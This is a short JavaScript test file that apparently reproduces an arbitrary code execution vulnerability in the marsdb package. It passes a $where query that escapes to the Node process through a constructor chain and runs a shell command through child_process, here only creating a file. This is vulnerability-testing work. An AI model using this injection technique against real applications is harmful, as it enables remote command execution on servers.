test("Arbitrary code execution in marsdb", () => {
  const fs = require("fs");
  const path = "./marsdb";

  expect.assertions(1);
  try {
      fs.unlinkSync(path, function (err) {});
  } catch (error) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let Collection = require("marsdb").Collection;
  const posts = new Collection("posts", { inMemory: true });

  posts.insert({ text: "MarsDB is awesome" }).then((docId) => {
    return posts
      .find({ $where: `(import("test").catch((e)=>{})["constructor"]["constructor"]("return process")().mainModule.require("child_process").execSync("touch ${path}"))` })
      .then((docs) => {
          expect.assertions(1);
          file_exist = fs.existsSync(path);
          expect(file_exist).toBe(true);
          fs.unlink(path, function (err) {});
      });
  });


});
